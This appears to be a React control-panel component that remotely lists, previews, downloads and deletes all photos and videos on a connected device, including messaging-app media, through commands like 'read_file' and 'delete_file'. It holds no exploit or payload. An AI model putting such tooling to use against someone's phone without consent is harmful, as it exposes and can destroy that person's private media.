import React, { useState, useEffect, useRef, useCallback } from 'react';

const formatSize = (b) => {
  if (!b) return '0 B';
  if (b < 1024) return b + ' B';
  if (b < 1024 * 1024) return (b / 1024).toFixed(1) + ' KB';
  if (b < 1024 * 1024 * 1024) return (b / (1024 * 1024)).toFixed(1) + ' MB';
  return (b / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
};

const formatDate = (ms) => {
  if (!ms) return '';
  return new Date(ms).toLocaleString();
};

const formatDuration = (ms) => {
  if (!ms) return '';
  const s = Math.floor(ms / 1000);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  if (h > 0) return `${h}:${String(m % 60).padStart(2,'0')}:${String(s % 60).padStart(2,'0')}`;
  return `${m}:${String(s % 60).padStart(2,'0')}`;
};

const btn = (bg, disabled) => ({
  background: disabled ? '#1e293b' : bg,
  border: 'none', borderRadius: 6,
  color: disabled ? '#475569' : '#fff',
  padding: '7px 16px', cursor: disabled ? 'not-allowed' : 'pointer',
  fontSize: 13, fontWeight: 600, opacity: disabled ? 0.6 : 1,
  transition: 'opacity 0.15s',
});

const FILTERS = [
  { key: 'all',   label: '🖼 All' },
  { key: 'image', label: '📷 Images' },
  { key: 'video', label: '🎬 Videos' },
];

export default function GalleryTab({ device, sendCommand, results, galleryStream }) {
  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;

  const [items,       setItems]       = useState([]);
  const [filter,      setFilter]      = useState('all');
  const [loading,     setLoading]     = useState(false);
  const [status,      setStatus]      = useState('');
  const [lightbox,    setLightbox]    = useState(null);
  const [viewerSrc,   setViewerSrc]   = useState(null);
  const [downloading, setDownloading] = useState(new Set());
  const [deleting,    setDeleting]    = useState(new Set());

  const seenResults     = useRef(new Set());
  const pendingViewer   = useRef(null);
  const pendingDownload = useRef(null);
  const activeStreamRef = useRef(false);

  const sendCmd = useCallback((cmd, params = {}) => {
    if (deviceId) sendCommand(deviceId, cmd, params);
  }, [deviceId, sendCommand]);

  const loadGallery = () => {
    if (!isOnline || loading) return;
    setItems([]);
    setStatus('');
    setLoading(true);
    activeStreamRef.current = true;
    sendCmd('get_gallery', { type: 'all', limit: 1000 });
  };

  // ── Progressive stream from galleryStream prop ────────────────────────────
  useEffect(() => {
    if (!galleryStream || !activeStreamRef.current) return;

    const { items: streamItems, loading: streamLoading, done, error } = galleryStream;

    if (error) {
      setLoading(false);
      setStatus('Failed: ' + error);
      activeStreamRef.current = false;
      return;
    }

    // Update items progressively as each chunk arrives
    if (streamItems && streamItems.length > 0) {
      setItems(streamItems);
    }

    if (done) {
      setLoading(false);
      activeStreamRef.current = false;
      const count = streamItems ? streamItems.length : 0;
      setStatus(`Loaded ${count} item${count !== 1 ? 's' : ''}`);
    }
  }, [galleryStream]);

  // ── Process command results (lightbox thumbnail, download, delete) ────────
  useEffect(() => {
    if (!results || results.length === 0) return;
    results.forEach(r => {
      if (seenResults.current.has(r.id)) return;
      seenResults.current.add(r.id);

      let data;
      try { data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response; }
      catch (_) { return; }
      if (!data) return;

      // ── Larger thumbnail for lightbox ──
      if (r.command === 'get_gallery_thumbnail') {
        const path = data.path || pendingViewer.current;
        if (pendingViewer.current && pendingViewer.current === path) {
          pendingViewer.current = null;
          if (data.success && data.thumbnail) {
            setViewerSrc(`data:image/jpeg;base64,${data.thumbnail}`);
          }
        }
      }

      // ── File download (via read_file) ──
      if (r.command === 'read_file') {
        const path = data.filePath || pendingDownload.current;
        if (pendingDownload.current && pendingDownload.current === path) {
          pendingDownload.current = null;
          setDownloading(prev => { const n = new Set(prev); n.delete(path); return n; });
          if (data.success && data.content) {
            try {
              const raw = atob(data.content.replace(/\s/g, ''));
              const bytes = new Uint8Array(raw.length);
              for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
              const blob = new Blob([bytes]);
              const url  = URL.createObjectURL(blob);
              const a    = document.createElement('a');
              a.href = url; a.download = path.split('/').pop();
              document.body.appendChild(a); a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(url);
              setStatus(`Downloaded: ${path.split('/').pop()}`);
            } catch (e) { setStatus(`Download error: ${e.message}`); }
          } else {
            setStatus(`Download failed: ${data.error || 'File may be too large (>10 MB)'}`);
          }
        }
      }

      // ── Delete ──
      if (r.command === 'delete_file') {
        const path = data.filePath;
        setDeleting(prev => { const n = new Set(prev); n.delete(path); return n; });
        if (data.success) {
          setItems(prev => prev.filter(it => it.path !== path));
          setLightbox(prev => (prev?.path === path ? null : prev));
          setStatus(`Deleted: ${path?.split('/').pop()}`);
        } else {
          setStatus(`Delete failed: ${data.error || data.message || 'Permission denied'}`);
        }
      }
    });
  }, [results]);

  const openLightbox = (item) => {
    setLightbox(item);
    setViewerSrc(item.thumbnail ? `data:image/jpeg;base64,${item.thumbnail}` : null);
    if (item.type === 'image' && item.path) {
      pendingViewer.current = item.path;
      sendCmd('get_gallery_thumbnail', {
        mediaId: item.id, path: item.path, isVideo: false, size: 600,
      });
    }
  };

  const closeLightbox = () => {
    setLightbox(null);
    setViewerSrc(null);
    pendingViewer.current = null;
  };

  const downloadItem = (item) => {
    if (downloading.has(item.path)) return;
    setDownloading(prev => new Set([...prev, item.path]));
    pendingDownload.current = item.path;
    sendCmd('read_file', { filePath: item.path, asBase64: true });
    setStatus(`Downloading ${item.name}…`);
  };

  const deleteItem = (item) => {
    if (!window.confirm(`Delete "${item.name}"?`)) return;
    setDeleting(prev => new Set([...prev, item.path]));
    sendCmd('delete_file', { filePath: item.path });
    setStatus(`Deleting ${item.name}…`);
  };

  const displayed = filter === 'all'
    ? items
    : items.filter(it => it.type === filter);

  const counts = {
    all:   items.length,
    image: items.filter(i => i.type === 'image').length,
    video: items.filter(i => i.type === 'video').length,
  };

  const streamedCount = galleryStream?.items?.length || 0;
  const isStreaming = loading && streamedCount > 0;

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', background: '#0f172a', color: '#e2e8f0', fontFamily: 'system-ui,sans-serif' }}>

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '14px 18px', borderBottom: '1px solid #1e293b', flexShrink: 0 }}>
        <span style={{ fontSize: 24 }}>🖼️</span>
        <div style={{ flex: 1 }}>
          <div style={{ fontWeight: 700, fontSize: 16 }}>Gallery</div>
          <div style={{ fontSize: 12, color: '#64748b' }}>All device photos and videos</div>
        </div>
        <button onClick={loadGallery} disabled={!isOnline || loading} style={btn('#6366f1', !isOnline || loading)}>
          {loading ? '⏳ Loading…' : items.length > 0 ? '⟳ Reload' : '⟳ Load Gallery'}
        </button>
      </div>

      {/* Live progress bar while streaming */}
      {loading && (
        <div style={{ flexShrink: 0 }}>
          <div style={{ height: 3, background: '#1e293b', overflow: 'hidden' }}>
            <div style={{
              height: '100%',
              background: 'linear-gradient(90deg, #6366f1, #818cf8, #6366f1)',
              backgroundSize: '200% 100%',
              animation: isStreaming ? 'none' : 'gallery-shimmer 1.5s linear infinite',
              width: isStreaming ? `${Math.min(95, (streamedCount / 10))}%` : '40%',
              transition: 'width 0.4s ease',
            }} />
          </div>
          <div style={{ padding: '5px 18px', background: '#0f172a', fontSize: 12, color: '#6366f1', display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ display: 'inline-block', animation: 'gallery-pulse 1s ease-in-out infinite' }}>●</span>
            {isStreaming
              ? `Receiving… ${streamedCount} item${streamedCount !== 1 ? 's' : ''} so far`
              : 'Scanning device media…'}
          </div>
        </div>
      )}

      {/* Status bar (shown when not loading) */}
      {status && !loading && (
        <div style={{ padding: '6px 18px', background: '#1e293b', fontSize: 12, color: '#94a3b8', borderBottom: '1px solid #1e293b', flexShrink: 0 }}>
          {status}
        </div>
      )}

      {/* Filter buttons — show even while loading once items start arriving */}
      {items.length > 0 && (
        <div style={{ display: 'flex', gap: 6, padding: '10px 18px', borderBottom: '1px solid #1e293b', flexShrink: 0, flexWrap: 'wrap', alignItems: 'center' }}>
          {FILTERS.map(f => (
            <button key={f.key} onClick={() => setFilter(f.key)} style={{
              ...btn(filter === f.key ? '#6366f1' : '#1e293b', false),
              border: filter === f.key ? 'none' : '1px solid #334155',
            }}>
              {f.label} <span style={{ fontSize: 11, opacity: 0.7 }}>({counts[f.key]})</span>
            </button>
          ))}
          {loading && (
            <span style={{ fontSize: 11, color: '#6366f1', marginLeft: 6, animation: 'gallery-pulse 1s ease-in-out infinite' }}>
              ● streaming…
            </span>
          )}
        </div>
      )}

      {/* Content */}
      <div style={{ flex: 1, overflowY: 'auto', padding: 12 }}>

        {/* Idle — not loading, no items */}
        {!loading && items.length === 0 && (
          <div style={{ textAlign: 'center', padding: 60, color: '#475569' }}>
            <div style={{ fontSize: 48, marginBottom: 12 }}>🖼️</div>
            <div style={{ fontSize: 16, fontWeight: 600, marginBottom: 8 }}>Gallery not loaded</div>
            <div style={{ fontSize: 13, marginBottom: 24 }}>
              {isOnline
                ? 'Click "Load Gallery" to browse all device photos and videos, including WhatsApp, Telegram, and other app media.'
                : 'Device is offline.'}
            </div>
            {isOnline && (
              <button onClick={loadGallery} style={btn('#6366f1', false)}>Load Gallery</button>
            )}
          </div>
        )}

        {/* Initial loading spinner — shown only before first items arrive */}
        {loading && items.length === 0 && (
          <div style={{ textAlign: 'center', padding: 60, color: '#475569' }}>
            <div style={{ fontSize: 36, marginBottom: 12 }}>
              <span style={{ display: 'inline-block', animation: 'gallery-spin 1.2s linear infinite' }}>⌛</span>
            </div>
            <div style={{ fontSize: 14 }}>Scanning device media…</div>
            <div style={{ fontSize: 12, marginTop: 6, color: '#334155' }}>
              Photos will appear as they are received
            </div>
          </div>
        )}

        {/* Grid — shown as soon as items start arriving, including while still loading */}
        {displayed.length > 0 && (
          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fill, minmax(120px, 1fr))',
            gap: 6,
          }}>
            {displayed.map(item => (
              <GalleryThumb
                key={`${item.id}-${item.path}`}
                item={item}
                onOpen={openLightbox}
                isDeleting={deleting.has(item.path)}
              />
            ))}
            {/* Skeleton placeholders at the end while still streaming */}
            {loading && [...Array(6)].map((_, i) => (
              <div key={`skel-${i}`} style={{
                aspectRatio: '1', borderRadius: 8,
                background: 'linear-gradient(90deg, #1e293b 25%, #273449 50%, #1e293b 75%)',
                backgroundSize: '200% 100%',
                animation: 'gallery-shimmer 1.5s linear infinite',
                border: '1px solid #334155',
              }} />
            ))}
          </div>
        )}

        {/* Empty filter */}
        {!loading && items.length > 0 && displayed.length === 0 && (
          <div style={{ textAlign: 'center', padding: 40, color: '#475569' }}>
            No {filter === 'image' ? 'images' : 'videos'} found.
          </div>
        )}
      </div>

      <style>{`
        @keyframes gallery-spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes gallery-shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        @keyframes gallery-pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .gallery-thumb { transition: transform 0.15s, box-shadow 0.15s; }
        .gallery-thumb:hover { transform: scale(1.05); box-shadow: 0 4px 16px rgba(0,0,0,0.5); z-index: 1; position: relative; }
      `}</style>

      {/* Lightbox */}
      {lightbox && (
        <Lightbox
          item={lightbox}
          viewerSrc={viewerSrc}
          isDownloading={downloading.has(lightbox.path)}
          isDeleting={deleting.has(lightbox.path)}
          onClose={closeLightbox}
          onDownload={downloadItem}
          onDelete={deleteItem}
        />
      )}
    </div>
  );
}

// ── Thumbnail card ────────────────────────────────────────────────────
function GalleryThumb({ item, onOpen, isDeleting }) {
  const src = item.thumbnail ? `data:image/jpeg;base64,${item.thumbnail}` : null;
  return (
    <div
      className="gallery-thumb"
      onClick={() => !isDeleting && onOpen(item)}
      style={{
        position: 'relative', aspectRatio: '1', borderRadius: 8,
        overflow: 'hidden', background: '#1e293b',
        cursor: isDeleting ? 'not-allowed' : 'pointer',
        border: '1px solid #334155',
        opacity: isDeleting ? 0.4 : 1,
      }}
    >
      {src ? (
        <img src={src} alt={item.name} style={{ width: '100%', height: '100%', objectFit: 'cover', display: 'block' }} loading="lazy" />
      ) : (
        <div style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 32, color: '#334155' }}>
          {item.type === 'video' ? '🎬' : '🖼'}
        </div>
      )}

      {item.type === 'video' && (
        <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <div style={{ background: 'rgba(0,0,0,0.55)', borderRadius: '50%', width: 32, height: 32, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14 }}>▶</div>
        </div>
      )}

      {item.type === 'video' && item.duration > 0 && (
        <div style={{ position: 'absolute', bottom: 4, right: 4, background: 'rgba(0,0,0,0.7)', borderRadius: 4, padding: '1px 5px', fontSize: 10, color: '#fff' }}>
          {formatDuration(item.duration)}
        </div>
      )}
    </div>
  );
}

// ── Lightbox ──────────────────────────────────────────────────────────
function Lightbox({ item, viewerSrc, isDownloading, isDeleting, onClose, onDownload, onDelete }) {
  const b = (bg, disabled) => ({
    background: disabled ? '#1e293b' : bg,
    border: 'none', borderRadius: 6,
    color: disabled ? '#475569' : '#fff',
    padding: '8px 18px', cursor: disabled ? 'not-allowed' : 'pointer',
    fontSize: 13, fontWeight: 600, opacity: disabled ? 0.6 : 1,
  });

  return (
    <div
      onClick={onClose}
      style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999, padding: 20 }}
    >
      <div
        onClick={e => e.stopPropagation()}
        style={{ background: '#1e293b', borderRadius: 14, border: '1px solid #334155', maxWidth: '92vw', maxHeight: '92vh', display: 'flex', flexDirection: 'column', overflow: 'hidden', minWidth: 280 }}
      >
        {/* Top bar */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderBottom: '1px solid #334155', flexShrink: 0 }}>
          <span style={{ fontSize: 14 }}>{item.type === 'video' ? '🎬' : '📷'}</span>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontSize: 13, fontWeight: 600, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{item.name}</div>
            <div style={{ fontSize: 11, color: '#64748b' }}>
              {formatSize(item.size)}
              {item.width > 0 && ` · ${item.width}×${item.height}`}
              {item.duration > 0 && ` · ${formatDuration(item.duration)}`}
              {item.dateTaken > 0 && ` · ${formatDate(item.dateTaken)}`}
            </div>
          </div>
          <button onClick={onClose} style={{ ...b('#334155', false), padding: '5px 11px', fontSize: 13 }}>✕</button>
        </div>

        {/* Media */}
        <div style={{ flex: 1, overflow: 'auto', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16, minHeight: 200 }}>
          {viewerSrc ? (
            <img src={viewerSrc} alt={item.name} style={{ maxWidth: '80vw', maxHeight: '65vh', objectFit: 'contain', borderRadius: 8 }} />
          ) : (
            <div style={{ textAlign: 'center', color: '#475569' }}>
              <div style={{ fontSize: 56, marginBottom: 10 }}>{item.type === 'video' ? '🎬' : '🖼️'}</div>
              <div style={{ fontSize: 13 }}>
                {item.type === 'video'
                  ? 'Video preview not available — download to play'
                  : 'Loading higher-res preview…'}
              </div>
            </div>
          )}
        </div>

        {/* Path */}
        <div style={{ padding: '5px 14px', borderTop: '1px solid #1e3a5f', background: '#0f172a', fontSize: 10, color: '#475569', fontFamily: 'monospace', wordBreak: 'break-all', flexShrink: 0 }}>
          {item.path}
        </div>

        {/* Actions */}
        <div style={{ display: 'flex', gap: 10, padding: '12px 14px', borderTop: '1px solid #334155', flexShrink: 0, flexWrap: 'wrap' }}>
          <button onClick={() => onDownload(item)} disabled={isDownloading} style={b('#1d4ed8', isDownloading)}>
            {isDownloading ? '⏳ Downloading…' : '⬇ Download'}
          </button>
          <button onClick={() => onDelete(item)} disabled={isDeleting} style={b('#dc2626', isDeleting)}>
            {isDeleting ? '⏳ Deleting…' : '🗑 Delete'}
          </button>
        </div>
      </div>
    </div>
  );
}
